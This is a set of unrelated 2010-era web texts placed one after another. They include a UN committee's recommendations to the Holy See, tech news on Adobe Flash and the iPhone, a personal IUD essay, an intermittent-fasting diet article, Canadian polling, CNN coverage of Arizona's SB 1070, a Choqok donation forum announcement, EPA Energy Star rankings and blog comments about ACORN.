In the spirit of the final document of the World Conference on Human Rights , the Committee wishes to encourage the State party to consider reviewing its reservations to the Convention with a view to withdrawing them .
“ 11 .
In view of the moral influence wielded by the Holy See and the national Catholic Churches , the Committee recommends that efforts for the promotion and protection of the rights provided for in the Convention be pursued and strengthened .
In that regard , the Committee wishes to underline the importance of wide dissemination of the principles of the Convention and its translation into languages spoken throughout the world , and recommends to the State party to continue to play an active role to that end .
“ 12 .
The Committee emphasizes the need for professionals and voluntary workers involved in the education and protection of children to receive adequate training and education , taking into account the principles set forth in the Convention .
The Committee also recommends that the Convention be included in the curricula of Catholic schools .
In this respect , it is the view of the Committee that the teaching methods used in schools should reflect the spirit and philosophy of the Convention and the aims of education laid down in its articles 28 and 29 .
“ 13 .
The Committee recommends that the position of the Holy See with regard to the relationship between articles 5 and 12 of the Convention be clarified .
In this respect , it wishes to recall its view that the rights and prerogatives of the parents may not undermine the rights of the child as recognized by the Convention , especially the right of the child to express his or her own views and that his or her views be given due weight .
“ 14 .
It also recommends that the spirit of the Convention and the principles set forth therein , in particular the principles of non-discrimination , of the best interests of the child and of respect for the views of the child , be fully taken into account in the conduct of all the activities of the Holy See and of the various Church institutions and organizations dealing with the rights of the child . ”

Mike Chambers , Adobe ’s Principal Product Manager for developer relations for the Flash Platform — and is n’t that title a mouthful ? — said in a blog post on Tuesday that the company will be ceasing its efforts to bring Flash - based applications to the iPhone .
This follows Apple ’s recent revision of its iPhone developer program license to include a statement prohibiting apps that have been developed using non-native technologies — such as Flash .
The move was largely interpreted as a shot directly across Adobe ’s bow , as the company ’s recently announced Creative Suite 5 included an easy way for Flash developers to convert their existing Web - based games and other Flash applications to iPhone apps .
That feature was Adobe ’s way of sidestepping Apple ’s choice not to allow Flash on its mobile platform .
But even though the Flash - to - iPhone functionality already exists , Chambers makes it clear that Adobe is “ not currently planning any additional investments in that feature . ”
Chambers went on to detail how the feature had only recently been blocked by Apple ’s change of terms .
He also took shots at the mercurial nature of the company with regard to its iPhone developer program and described how Adobe ’s inherently cross-platform focus differs from Apple ’s tightly controlled walled garden approach .
Moving beyond its efforts to play nice with the iPhone , Chambers says Adobe is now focusing on Google ’s upcoming Android phones and tablets , working closely with Google to bring technologies like Flash Player and Adobe AIR to the Android platform .
Then again , with the iPhone route securely blocked , what other options does Adobe really have ?
[ via The Loop ]
My period came today .
The cramps are ... bad .
In fact , they 're worse than they were even just last month , because a few weeks ago , I made a choice that increasing numbers of young , childless American women share : I got an IUD .
Advertisement
My history with hormonal birth control is pretty extensive and not particularly positive .
I 've done time in the stirrups in order to get a prescription in four different countries , and the language barriers were nothing compared to the vagaries of four different health systems and four different systems of medical - cultural knowledge about oral contraceptives .
I 've tried a whole lot of pills .
Some were expensive , some were free .
( Thanks , New Zealand health - care system ! )
On one , I 'd get a nasty yeast infection every time I got my period .
It took me almost the duration of my prescription to figure out the pill was the cause , because nobody had warned me of that side effect .
( It 's a common one .
This is why it 's important for women to talk each other about our health . )
As far as I was concerned , the bare minimum in cool pill features was the ability to skip my periods .
One would n't let me do that !
Another pill gave me bad skin .
Another , weight gain .
Another , migraines .
I tried Ortho Tri-Cyclen , Ortho Tri-Cyclen Lo , Mercilon , something weird and Swiss — and I 'm probably forgetting a couple .
On all of them , I experienced a loss of sex drive — a dramatic and unwanted , though admittedly effective , way of preventing pregnancy .
My desire to continue taking the pill — for its reliability , for its ease , for its invisibility , for all the reasons that made its development a victory for the human race and the most popular contraceptive choice of women the world over — eventually crumbled because of my body 's rebellion .
I did n't need to find " the right " pill ; I needed something else entirely .
Something without hormones .
And so I turned to the IUD .
Advertisement
The IUD is the only long - term contraceptive method that has no artificial hormones .
It 's a small , copper - wrapped device in the shape of a capital T that sits inside the uterus and prevents babies from happening .
Copper - only IUDs can last up to 10 years ( but you 'll menstruate , sometimes heavier than you did without it ) .
A related device , a hormonal IUD which contains copper plus a low dose of slow - release artificial progesterone that the device delivers right to your uterus , lasts up to 5 years and will give you shorter , less painful periods ( if you had pain with your period before , anyhow ) .
IUDs need to be inserted and removed by a gynecologist .
They are more effective than the pill , because you , the user , do n't have to remember to do anything with them but check once a month for the monofilament strings ( like fishing line ) that dangle out through your cervix , just to make sure your IUD is still in place .
Getting a doctor who would give me , a childless and never - pregnant woman , an IUD took some wrangling .
An entire generation of American medical professionals were made suspicious of IUDs thanks to an intra-uterine device manufactured in the U.S. in the 70s called the Dalkon Shield , which caused 17 deaths , many life - threatening infections , and was the subject of a notorious class - action lawsuit .
( I would actually encourage anyone interested in getting an IUD to read up on this history , if only to understand the differences between this early device and modern IUDs , and to better understand the resistance many medical practitioners of that generation still have to IUDs , especially for younger patients .
The best coverage I have yet read of the bloody scandal in the U.S. is this 1976 story by Mark Dowie and Tracy Johnston .
And this 1979 one by Barbara Ehrenreich covers how after the Dalkon Shield was taken off the market in the U.S. , the dangerous devices were dumped on the Third World where they killed many more women .
Both articles are from Mother Jones . )
The main problem with the Dalkon — its wicking strings were a built - in vector of infection that caused many women to develop Pelvic Inflammatory Disease — has been resolved with modern IUDs , making them a safe and effective birth control option .

I had one doctor , a middle - aged woman , flat - out refuse my request .
She said that an IUD was a good choice for women who had already completed their families but who did not want a tubal ligation — and only those women .
But really , it makes no sense to deny young women the option of an IUD .
With the average age of first sexual intercourse hovering around 16 , and the average age of first childbirth now in the late 20s throughout most of the developed world , young women are the cohort most in need of a long - lasting and highly reliable method of contraception .
If I could have had my IUD inserted at age 19 or 20 , rather than continuing a fruitless search for the pill that would suit me , I 'd have saved myself more than a few migraines .
Planned Parenthood finally helped a girl out .
The nurse and the two gynecologists I saw at my local center were happy to give me my tiny new ParaGard Copper T 380A .
The cost , both for the appointment and the device , was minimal .
Warned by the doctors and WebMD , I took 800 mg of ibuprofen the morning of my visit .
Advertisement
Did the insertion hurt ?
It felt like someone was throwing darts at my cervix .
Involved were : a larger - than - normal metal speculum , a long cervical clamp that looked like a kind of narrow - bore eyelash curler , a straight metal uterine sound ( like a dipstick for your business ) , and the IUD itself , which came packed into a kind of drinking - straw , its little arms folded down by its sides .
The clamp was bad .
The sound was worse — when the doctor pushed it past my cervix clear until it touched the top of my uterus , I felt a spasm unlike any cramp I 'd felt before , like something deep inside me being twisted up and wrung out .
Advertisement
When the doctor slid the sound back out , she picked up the IUD , removed its sterile packaging , and placed the device into my uterus .
The beak of the clamp was still holding my cervix open .
I could tell the IUD was smaller than the sound ; this part did n't hurt as much .
She retracted the little drinking straw and the IUD 's arms flipped into place .
( I could n't feel that part at all . )
Then she took out the clamp — I sighed — and slid out the speculum .
When it was all over and I stood up , I found myself bleeding a bit .
The pain is relative : I 've never had a colposcopy , but one friend who has said the tool used reminded her of " a vegetable peeler for your cervix . "
I suspect that hurts worse .
Surgery would be worse .
Appendicitis must be worse .
Childbirth has to be worse .
A lot of things about being a woman totally suck , especially when it comes to health care — the fact that there is still no such thing as a medical contraceptive option for men , and apparently no interest from the scientific community about inventing one , is just more evidence — and getting an IUD put in is one of them .
It 's not fun .
But , for me , it 's far better than any available alternative .
And the discomfort of insertion hardly rates in comparison to the joy of ten easy years of baby - free living .
Now I do n't have to worry about contraception until 2020 .
Advertisement
Like anything , there are complications that can arise that are exceedingly rare but frightening .
The device can become embedded in the uterus during insertion , and it can even perforate it .
( For a few days after the insertion , and for no other reason but that I am given to paranoia about such things , every time I had gas I thought for a second that I must be the one woman out of a million who perforated her damn uterus . )
Like the pill , an IUD provides no protection from STDs or HIV .
For that , only consistent condom use and testing will reduce your risk .
Advertisement
The risk of pregnancy with an IUD is minuscule , less than 0.1 % for the first year .
That makes it more effective than the pill , and about as effective as tubal ligation ( but , obviously , not permanent .
You can become pregnant immediately after removing an IUD ) .
But if you do fall pregnant while using an IUD , that embryo is more likely to implant in your fallopian tube — and ectopic pregnancy is life - threatening .
Interestingly enough , the exact method by which an IUD prevents pregnancy is n't fully understood — it 's thought that the copper plays a role in confusing sperm motility to prevent fertilization , and the copper may react with the uterine lining to make it inhospitable for implantation .
( It 's not really fun to read medical literature in the conditional tense . )
The hormones in the Mirena IUD also thicken cervical mucus , which is another good defense against pregnancy .
I can't feel my IUD at all , and that 's how it should be .
I have noticed , twice now , bleeding directly after sex — which is just fucking weird , and scared me half to death the first time it happened .
The strings that dangle from the IUD pass through the cervix , and my doc said they can abrade it if they shift around ; hence , blood .
Since stopping the pill , I 've given in to the routine of menstruation ( because I 'm using the copper IUD ) , and it 's tolerable .
Having a period with a foreign body in my uterus is n't that bad .
My cramps are , like I said , a little worse than normal ( my periods are naturally , I guess , fairly light - to - medium ) , but I 'm told that can get better with time .
Advertisement
For hormone - free birth control , this is all well worth it .
Actually , it kind of has to be worth it , because the IUD is my only choice to stay baby - free without a cocktail of artificial hormones coursing through my system ( unless and until science improves upon the options ) .
But right now , with my insertion experience fast becoming another victory for memory repression , and the device 's removal a very distant proposition , I 'm feeling pretty damn good about it .

How I Learned To Stop Worrying And Love My IUD
February was a busy month and I did n't get around to posting much .
Since things have cooled down a bit and I need to get back into the habit of writing , I 'm gonna kick off this month with an article that touches on a few factors that I believe are important for anyone wanting to maintain a lean appearance at all times of the year .
I 've never been a fan of the bulk and cut approach .
An approach often taken to the extreme by some of my peers , with the net result being that they only look decent during the summer months .
Simply not my style .
Perhaps it 's a consequence of growing up fat .
Perhaps it 's because I 'm more impressed by feats of great relative strength , for which leanness is critical .
I 'm not sure .
It is what it is , like the saying goes .
Once I cut down to 5.5 % body fat by late December 2007 , I decided I wanted to stay that way if it was possible .
Possible in this case meaning if I could maintain my sanity , social life and not feel miserable .
I questioned the possibility since I failed many times in the past .
Sure , I got plenty lean before .
That was n't the problem .
I managed to get very lean for shows and photo - shoots back when I was modelling .
Getting there was n't the problem .
Staying there was .
But I 'd come a long way since my semi-starved modelling career and had managed to adopt a new perspective on things .
It would prove to be crucial for my success this time .
This is my current condition .
I 'm a little heavier than I was in October , but not by much .
Maintaining the lean state
I use and work with four different approaches to intermittent fasting .
All of them entails a 16 hour fast followed by 8 hours of feeding .
3 meals usually , 2 or 4 meals less usually .
1 . Fat loss .
Maximizing fat loss and minimizing muscle loss .
2. Lean gains .
Maximizing muscle gain and minimizing fat gain .
3. Bodyrecomposition .
Simultaneous muscle gain and fat loss .
4. Lifestyle ( or maintenance ) .
Incorporating intermittent fasting as a lifestyle diet that is very sustainable in the long run .
The difference between this and other approaches are in the form of much looser guidelines and lessened focus on macronutrient and calorie - cycling .
Slow bodyrecomposition can still occur .
The diet changes depending on what my clients favor , but they have many things in common .
There 's a system to it - specific guidelines for each approach .
There 's no guesswork .
I 'm fairly specific .
Left are the lowest common denominators that I believe are conducive to maintaining , or achieving , the lean state .
I will cover a few of them below .
Intermittent Fasting
Diet

Food choices
Calories and macronutrients : timing and cycling .

Summary
One of my clients , Andreaz , after months on a lean gains phase .
As you can see , he remained lean throughout the whole process .
Weight gain was slow , but fat gain almost non-existent .
This picture was taken a few days before we switched to a fat loss diet .
Well , this one was fairly predictable .
Nevertheless , it needs to be addressed first and foremost in this article since it played such an important role for me .
Intermittent fasting was a key factor in allowing me to stay very lean and looking great 365 days a year .
It was the golden ticket .
While I do n't think intermittent fasting is for everyone , it released me from the chains of feeling the need to eat every 2 - 3 hours .
It spared me the torture from having to be content with tiny kindergarten - style meals that would only leave me wanting more .
Some people may feel differently .
Maybe they feel " just right " after a small meal every so often , and maybe they maintain a low body fat doing just that .
But I never really felt satisfied with that approach .
I always failed when I tried , and I tried for years .
I did 5 - 6 meals of 400 - 500 calories or so and still felt like I was dieting .
Sooner or later I 'd blow my diet and overeat ( a lot ) .
I prefer to eat big .
When I eat , I eat .
When I do n't , I do n't .
That 's how I 'm wired and trying to fight against my natural inclinations always caused me to fail .
Intermittent fasting is in my opinion a very effective way to maintain some hedonism in your life while staying lean .
I 'm able to eat awesome meals ( some go as high as 2000 kcal ) without adding body fat .
I would n't be able to do that on the six - meal - a - day - diets I tried to maintain on in the past .
I never get cravings anymore .
I do n't fiend around for snacks .
I do n't need them .
The foundation of a diet conducive to maintaining and achieving the lean state needs to be built on a few specific dietary fundamentals .
My framework contains a few rules that I adhere to most of the time .
Following these rules makes maintenance of the lean state possible and enjoyable .
These dietary fundamentals can be said to establish a low body fat settling point ( not the same as set point ) .
This is what you can control to make sure you remain lean despite not having the genetic makeup for it .
I sure do n't .
I grew up fat .
But with the following strategies , I 've remained very lean for years now .
And it feels great .
However , I should note that these rules are meant to be broken from time to time .
Life will come in the way some days .
Flexibility and a non -rigid mindset are important traits to make this work .
Robert has been on a lean gains diet for almost four months without any noticeable fat gain .
He 's made substantial strength gains despite only gaining 4 lbs .
Some people rely heavily on cardio in order to maintain their leanness .
This allows them to be somewhat more lenient with their diet .
I am however no fan of cardio and do n't use it to stay lean .
In my view cardio as a strategy to maintain a low body fat percentage is not only time - consuming , but also a sure - fire way to hamper muscle and strength gains .
If nor time or muscle gain is a concern then by all means continue your cardio regimen .
But considering my priorities and those of my clients , I focus on the macrocomposition of the diet to maintain the lean state .
You 'll often hear that 1 g protein / lb body weight is a good guideline for muscle gain .
That 's true .
Studies show no additional benefit in going higher than that , assuming adequate calorie intake .
But protein has other important qualities .
I put great emphasis on it in every diet I design and believe it needs to be kept higher than the generic guidelines .
First and foremost , the effect on satiety is far superior to both carbs and fat .
This ensures good diet compliance , since you wo n't get hungry and risk overeating .
Secondly , TEF ( Thermic Effect of Food ) is much greater for protein than for both carbs and fat .
It 's so significant that a researcher named Livesey proposed that protein should actually be counted as 3.2 kcal and not 4 kcal as the current guidelines state .
In simple terms , in comparing two hypo-energetic diets at the same calorie intake , the diet with the highest protein percentage of total calorie intake will show superior results
Last but not least , a high protein intake is absolutely crucial during fat loss if you want to optimize retention of muscle mass while losing weight .
A high protein diet is a key strategy to prevent overeating and warding off fat gain when attempting to gain qualitative weight .
For fat loss additional benefits arise in terms of greater satiety , accelerated fat loss and sparing of lean mass .
Most of your diet should consist of whole and unprocessed foods .
One critical mistake people make when transitioning from dieting to ( failed ) maintenance or a muscle gaining diet is changing the food composition of the diet significantly .
Out goes the fibrous veggies and whole food protein and in comes the refined carbs and protein shakes .
Such foods invite overeating sooner or later .
Most people do n't have a problem gaining weight , they have trouble keeping it off - especially after dieting and reaching a low body fat percentage .
What you ate during your fat loss diet , satiating foods like veggies , fruit , berries , meat and cottage cheese , should also be a staple of your diet regardless of goal ( muscle gain , bodyrecomposition , lifestyle ) .
And minimize liquid calorie intake .
Chew your calories , do n't drink them .
While I 'm not big on supplements , there are a select few that should be added to your diet if there is a need for it .
For example , calcium increases fat excretion and Vitamin D plays an important role for metabolism .
Making sure there is no lack of these micronutrients is therefore conducive to maintaining the lean state .
For more on this , check out my supplement guide where I list the stuff I consider useful .
I 've talked about this numerous times on the site , but in short I believe macronutrient and calorie cycling is an important part of a proper intermittent fasting setup .
I 've mentioned the potential benefits with regards to partitioning in the past , but this time I 'd like to put a little more focus on the behavioral aspects .
Simply put , there 's a tendency for people to go lax and take too many liberties on diet setups and do n't cycle phases of over - and underfeeding cycles .
Surplus calories should not be consumed each and every day , but in conjunction with training - when they are likely to be used for repair of damaged muscle tissues and recovery of glycogen stores .
Conversely , slight underfeeding on rest days may have benefits mediated via mechanisms that kick in during calorie restriction ( on top of the independent and positive effects of intermittent fasting ) , such as improvement in blood lipids and other health markers .
And then there 's the fact that people simply get more productive with a lessened focus on food on rest days - they get stuff done .
But this effect is unique for the short term .
It 's certainly not something that occurs with prolonged dieting , where thoughts of food may become overwhelming and obsessive .
I actually prefer to have a few dieting days now and then .
I 've noticed I am at my most productive during those days and I certainly do n't experience " dieting " symptoms such as increases in hunger .
So , cycling between overfeeding ( training days ) and slight underfeeding ( rest days ) is another excellent strategy to remain lean regardless of your goal .
The benefits are not only physiological , but also behavioral .
Some of my clients get anxious about attending social events , such as big family gatherings , parties and weddings .
There will be tempting foods , maybe alcohol and various snacks and they will likely deviate from their diet .
And when some people deviate from their diet , they lose control and overeat ( usually on a plethora of sub par foods and snacks ) .
Learning how to tackle social events that involve eating is therefore important for anyone wanting to get lean and remain lean - unless you plan on living your life like a hermit .
These events can be made into smaller issues with a good dose of self - control .
But I can't assume that everyone is able to " eat in moderation . "
No , I have special strategy for such occasions .
Assuming the event is in the evening , and that the client initiates his feeding phase around noon , I tell them to eat their full allotment of protein for the day before attending the event .
They should keep everything else low ; fat and carbs are consumed in whatever low amounts that are contained in the high protein foods eaten before the event .
This creates a big caloric buffer for social eating AND ensures that the client comes to the party reasonably satiated and less prone to eat a bunch of junk .
Consider this easy and non-challenging strategy yourself .
It has been a great help for myself and many clients . *
I follow intermittent fasting to maintain a shredded physique 365 days a year .
For me and many others , it 's an excellent way to enjoy dietary freedom without feeling deprived and constrained to your diet . *
I maintain a high protein diet and cycle carbs and fat depending on day .
I chew most of my calories and my diet consists of whole foods primarily .
By doing this , I 'm rarely hungry and the diet is enjoyable and varied .
I also believe that there physiological and behavioral benefits to macronutrient / calorie - cycling . *
I 'm flexible and never let my diet rule my life get in the way of enjoying myself .
Remember , it 's the diet that you maintain 80 % of the time that will dictate how you look .
Not the occasional indulgences .*
There are easy strategies for tackling social situations , such as saving up for a " caloric buffer " later in the day .
So that 's all for today .
There 's a little more to it , but I might save that for another article .
Or my book , whenever the hell that will be out .

OTTAWA — Canadians are looking more favourably at the NDP as they become increasingly disenchanted with the two main political parties , a new poll suggests .
The Canadian Press Harris - Decima survey indicates support for Prime Minister Stephen Harper ’s Conservatives slipped to 29 per cent amid the furor over the Guergis - Jaffer affair .
That ’s the first time in a year that the governing party has dipped below the 30 per cent threshold .
But the beneficiary this time was not the Liberals — who usually gain when Tories lose ground and vice versa .
Indeed , the Liberals were stalled at 27 per cent .
Rather , it was the New Democrats who rose three points to 20 per cent — a level of support the party has n’t enjoyed since shortly after the last election in October 2008 .
The NDP , which typically runs a distant third , now appears to be “ benefiting from not being the other guys , ” Harris - Decima chairman Allan Gregg said in an interview .
Gregg said it ’s unprecedented to have both the Conservatives and Liberals languishing simultaneously below 30 per cent .
“ In my memory , I can never recall both major political parties being under 30 per cent of the popular vote — ever .
To me , that ’s the stunning part , ” the veteran pollster told The Canadian Press .
“ It ’s a reflection of the general disgust of the major options that are available to most voters . ”
Gregg said the Tories have no doubt been hurt by allegations of unethical — and possibly illegal — conduct swirling around disgraced former cabinet minister Helena Guergis and her husband , former Tory MP Rahim Jaffer .
But he believes the latest poll results are symptomatic of a deeper malaise among Canadian voters .
He pointed to another Harris - Decima survey earlier this month , in which Canadians expressed little confidence in either the Tories or Liberals to manage the economy , balance the books or reflect their values .
Indeed , more Canadians picked “ None of the Above ” or “ Do n’t Know ” than chose any federal party on those key issues .
“ That ’s a reflection , as I say , of general , if not disgust , certainly massive dissatisfaction with traditional choices , ” Gregg said .
Liberals have gone gangbusters on the Guergis - Jaffer affair , pummelling the government over every twist and turn in the controversy .
By comparison , the NDP has been more restrained and Gregg said that may be helping the party differentiate itself from the other two mainline parties .
Gregg noted a remarkable similarity between the apparent rise of the NDP in Canada and the sudden surge in support for the Liberal Democrats , the traditional third party in Britian which has become a real contender in the current U.K. election campaign .
“ The parallels are massive . ”
The telephone survey of 2,014 Canadians was conducted April 15 - 25 .
A sample this size is considered accurate within a margin of error of 2.2 percentage points , 19 times in 20 .
Joan Bryden reports for The Canadian Press .

( CNN ) --
These days , Jessica Mejia does n't leave the house without three pieces of identification to prove her citizenship .
Mejia , a University of Arizona student who was born and raised in Tucson , says the habit formed last week , after a series of raids in Arizona targeting illegal immigrants .
And now , a new state law that cracks down on illegal immigration has given her more cause for concern .
" Even if you 're legal , you 're in fear that maybe your driver 's license is n't going to be enough or if you 're walking down the street and the police stop you , " said Mejia , 21 .
" It 's a constant fear we 're living in and even legal citizens are afraid to go out . "
Senate Bill 1070 is set to take effect in August or September , if it withstands legal challenges that a number of groups who oppose the legislation are expected to raise .
Mejia 's concerns were echoed by others in Tucson and across the country who oppose the legislation , which requires police to question people if they have reason to suspect they 're in the United States illegally .
Mejia , who helped organize a protest in front of the state capitol Friday , is one of many student activists in Arizona organizing against SB 1070 .
Protests continued Sunday outside the capitol building in Phoenix , with hundreds gathering in a largely peaceful demonstration against the new measure .
Read about Sunday 's protest
The law also requires legal immigrants to carry their alien registration documents at all times .
But U.S. citizens like Mejia , who identifies herself as Chicana , says she carries her driver 's license , voter registration card and school fingerprint card at all times out of fear of being racially profiled .
" How can you tell what will give an officer reasonable suspicion to stop you ? " she said .
" We understand there 's a need for protection on the border , but we think it should come more with immigration reform , not by pulling over people and stopping them on the street . "
Opposition to the bill is also coming from elected officials at various levels of government in Arizona .
Phoenix Mayor Phil Gordon said he has scheduled an item for the Tuesday session of City Council to prepare for legal action against SB 1070 .
" I will direct the city manager and city attorney to file a lawsuit against the state to enjoin the law from going into effect and have it declared unconstitutional , " he said .
Supporters of the law say it fills a void left by the federal government 's failure to properly address immigration reform .
" One of the few enumerated , delegated and specified duties and powers given to the federal government in the Constitution is to provide for the common defense of the nation .
In this they have failed by not securing the border and by not keeping immigration law up to date with the needs of our nation , " said CNN iReporter Tom B. , a defense contractor in Iraq who did n't want his last name to be used for security reasons .
Read why iReporter supports law
" This law will allow local law enforcement in the course of their duties to question individuals in regards to their immigration status .
Since Arizona is a border state they are the site of the main issue at hand , " he said in an e-mail .
Arizona state Rep. Russ Jones , who voted for the bill , said the state felt compelled to craft its own legislation .
" Until the federal government actually puts up an effective border fence securing our southern border , we cannot sit back and hope for the best while our laws are broken every day and the hands of law enforcement are tied . "
Read more from Rep. Russ Jones
Gov. Jan Brewer signed the legislation Friday , citing border - related crime as a key factor .
She also issued an executive order that requires additional training for local officers on how to implement the law without engaging in racial profiling or discrimination .
The rules , to be established in by the Arizona Peace Officers Standards and Training Board , are due back to her in May .
The law goes into effect 90 days after the close of the legislative session , which has not been determined .
Other police organizations that support the bill , including the Phoenix Law Enforcement Association , say the legislation has numerous safeguards to protect the rights of minority groups .
" The bill requires reasonable suspicion for officers to make contact and also contains language that allows officers discretion in enforcing the law , " a statement on the group 's website says .
" Officers cannot stop a person based solely on race , color , or national origin . "
The Arizona Association of Chiefs of Police , which had opposed the measure , issued a statement saying , " Law enforcement professionals in the state of Arizona will enforce the provisions of the new law to the best of their abilities . "
The bill 's passage immediately triggered vows from advocacy groups across the country to pursue legal action to stop it in its tracks .
Victor Viramontes , senior legal counsel for the Mexican American Legal Defense and Education Fund , said his organization plans to ask the federal government for a permanent injunction to prevent the law from taking effect .
" What we need is singular immigration policy , and that 's what the Constitution mandates .
The Arizona statute stands in the way of the federal government 's ability to do its job by overwhelming the system , " Viramontes said .
Most undocumented immigrants follow the laws of the country , Viramontes said , and deserve the same human rights afforded U.S. citizens .
" Sometimes it 's politically expedient to target undocumented immigrants and push them further into shadows , but they 're already some of the most vulnerable to civil rights abuse , and the Legislature 's role should be to protect these contributing members of society . "
On the ground in Arizona , students and young people are at the forefront of the fight , using social media and technology to organize .
" As soon as [ Brewer ] signed that bill it shook the hornet 's nest .
It awoke not only Arizona , not only our community , but the nation , " said Jeff Santino , a student organizer and graduate student at the University of Arizona .
" People are all flooding us with support and I think we need to garner that support . "
Mejia said her generation owes it to future generations to ensure they do n't grow up in a society that legalizes discrimination .
She said she also feels a debt to her parents and grandparents , who may be too busy working to support their families to engage in a political fight .
" I feel like it 's a really big responsibility on our shoulders to protect our community when they do n't have voice in what 's going on . "
CNN 's Thelma Gutierrez contributed to this report .

As a result of my previous post about speeding up Choqok development by community help , I have launched a BBPress forum to do the job .
Why forum ?
We need a platform to discuss about features and Ideas and their implementation as needed , And of course , It should be in a way that others ( than me ) can create entries .
Extendable platform may help us later .
It should be super light .
How do it works ?
Someone starts a new topic in New Idea forum with information about what ’s in his / her mind to be implemented in Choqok .
He / She announces it anywhere thinks that interested peoples can find it ( i.e. Identi.ca ) to get here and help us in development .
Then We ( Interested users and me ) will discuss about it and it ’s implementation and will set the donation amount it requires to be implemented .
Now we have to collect donation for it :
Anyone who wants to have that feature sooner ( and likes to help to its development ) can donate to it .
He / She should note in donation comment about what feature / idea he / she donates to !
When donation is about to reach the requirement , I will start to implement the idea , and it ’s topic in forum will move to Under Development forum .
still we can discuss about it there !
And when them implementation is done !
I ’ll announce it there and move topic to Implemented forum .
I have added some ideas there for example and to start this job ,
You can add your ideas you want to donate to their implementation
Or think that there are users who like to donate to their implementation .
When you add an idea or see an interested idea there , You can ( better to ) spread the word and tell other users about it , to donate for it and have it sooner .
There are 4 different forums there :
New Idea –
Add your ideas here ,
We will discuss about them and I announce the donation amount to implement them !
This is the main forum to discuss , Anyone can create a new topic ( idea ) to start .
– Add your ideas here ,
We will discuss about them and I announce the donation amount to implement them !
This is the main forum to discuss , Anyone can create a new topic ( idea ) to start .
Under Development
When new idea donated amount reached the required , I will move it to this forum , It ’s still open to discuss
But nobody can create a new topic here !

Implemented – Ideas will come here after they ’ve implemented !
When implementation of an idea is done and pushed to svn / git repository , It ’s topic will move here from Under Development forum .
This forum is read only too !

Free Discussion –
If you want to discuss about other Choqok related topics , come here
This forum is just open to contain other Choqok related discussions !
Of course this is not the only way to continue Choqok development !
We will have previous developments as well !
But we want to make the process faster .
OK , Let ’s Begin …

Los Angeles and Washington took the top spots in the United States Environmental Protection Agency ’s ranking of cities with the most energy efficient buildings .
Los Angeles was the star of the Energy Star rankings , with 293 buildings achieving the E.P.A. designation , according to the Top 25 list released Tuesday .
The agency awards the Energy Star label to commercial buildings that rank among the top 25 percent in energy efficiency compared with similar structures .
Washington took second place with 204 Energy Star buildings while San Francisco , which has about 20 percent of the population of Los Angeles , came in third with 173 buildings .
Denver and Chicago rounded out the top five .
With 90 Energy Star buildings , New York City ranked 10th , behind Houston , Lakeland , Fla. , the Dallas - Fort Worth area and Atlanta .
Detroit came in 15th , just behind Seattle and ahead of cities with decidedly greener reputations like Austin , Tex .
The number of buildings qualifying for the Energy Star award jumped 40 percent from 2008 , when the E.P.A. first issued the ranking .
Collectively , the 3,900 buildings that won Energy Star ratings in 2009 cut carbon dioxide emissions by more than 4.7 million metric tons , saving some $ 900 million in energy costs , according to the E.P.A .
The agency said commercial buildings ’ energy consumption accounts for 17 percent of the nation ’s greenhouse gas emissions .

I 'm unaware of that " narrative " .
You would n't just be making stuff up again , would you ?
Just the way you guys made up your phony attacks on ACORN ?
Since you said we 've promoted that narrative , I 'm sure you 'll have no problem pointing me to such a promotion here .
If not , consider this your warning that , as per the few rules we have for commenting here on The BRAD BLOG , the posting of knowing disinformation is a bannable offense .
In lieu of such evidence to back up your charge , you now know that allegation is disinformation .
Do it again , and you 'll not be posting here for long ( whether I agree with your points is irrelevant , btw , and has nothing to do with our rules for posting here . )
Thank you .

Breaking : Another ACORN Court Victory ; Federal Judge Strikes Down Funding Ban as Unconstitutional Perhaps now , with the hoax so thoroughly exposed , with the community group having been cleared of wrongdoing by one formal investigation after another , with Judge Gershon having shamed both Congress and the corporate owned media for having ignored the fundamental precepts of our constitutional system of government , Congress and the corporate media will , finally , step forward and correct the terrible injustice they imposed on a benevolent , if imperfect , community organization .

Paul L , congratulations .
You have pwned brad .
You were correct when you stated that he was wrong about " the wingnut attacks on ACORN " .
The right has successfully destroyed an organization that was :
A ) proven innocent of all crimes it has been accused of
B ) slandered by the media , print , televised , etc
C ) tasked with helping empower and assist the wretched of the earth .
Congratulations in your sides success , in overcoming such obstacles as decency , truth , compassion , empathy ...
The libelous right wing vendetta against ACORN has succeeded , and thus cost thousands of poor people future assistance in achieving suffrage , living wages , decent housing , and job assistance .
This has ensured that it will be easier in the future for right wing suckers like you to elect cruel reactionaries who will continue to rob your ass blind , send your friends and family off to die in some godforsaken hellhole with lovely natural resources .
The right has won .... as usual
But because they are incapable of acknowledging the implications of such a thing and truly taking any responsibility for their actions , they will continue to insist that people are poor due to immorality or laziness ( not due to the only groups helping them being de- funded and de-famed ) , the wars they wage are going badly due to the magical power of liberal actors to inflict defeat on " the troops "
and that their own problems are all due to minorities , taxes , big guvmint , atheists , immigrants , etc. Bravo sir

The wingnut attacks on ACORN were a failure , Paul L , and only serves to prove that a lie makes it around the world before the truth can ever get its shoes on .

Paul you did n't prove what you claimed " What happened to progressive nutroots narrative promoted by Media Matters and their ilk( Brad Blog ) that the wingnut attacks on ACORN had FAILED FAILED FAILED !!!! "
Where exactly in what you quoted is Brad claiming the rightwing attacks on ACORN failed ?
What you posted does n't prove your point .
It does n't show that Brad had claimed that .
Actually just the opposite , the complaint is that the NYTimes and crew ate the shit that was shoveled to them unquestioningly just as they ate the shit sandwich served up in lead up to the Iraq War .
The right wing attack worked nevermind that it was n't based on truth .
That 's how McCain lost in 2000 with the SC black child smear .
How Dukakis got smeared .
Its the Lee Atwater school of marketing .

The right has a lot to crow about today !
They proved beyond a shadow of a doubt that the national media can be easily manipulated into promoting a false story .
In the process they accomplished their goal of disenfranchising poor Americans to preserve their undemocratic grip on power in this country .
In the process the also proved beyond a shadow of doubt that they do not care for the poor of this country or have any concern for the daily suffering of their fellow Americans who were not born with a silver spoon in their mouths .
Nice Job Breitbart et al .
Sleep well tonight knowing that thousands of your fellow countrymen , women and children are now effectively cut off from aid and out of participating in electoral process .
Your parents must be proud !

Unbelievable !
To think all this happened just because the New York Times would not issue a simple correction about the minor point they got wrong in a couple of stories about the clothing O'Keefe was wearing when he visited the ACORN offices .

Where is one attorney to take down the pigs who slandered ACORN and to have after The New York Times for there shoddy reporting of lies ?
There must be culpability on this issue .

This is just so sickening .
In effect the entire national political class came together to destroy Acorn .
And why ?
I 'm guessing it 's because most of those people did n't want any smelly poor black people messing up their social scene while openly organizing voter registration drives in black areas of big cities .
How embarrassing to be associated with that kind of crowd !

Barbara Glassman : The Associated Press does n't have any more credibility then the NYT , especially in regards to election integrity .
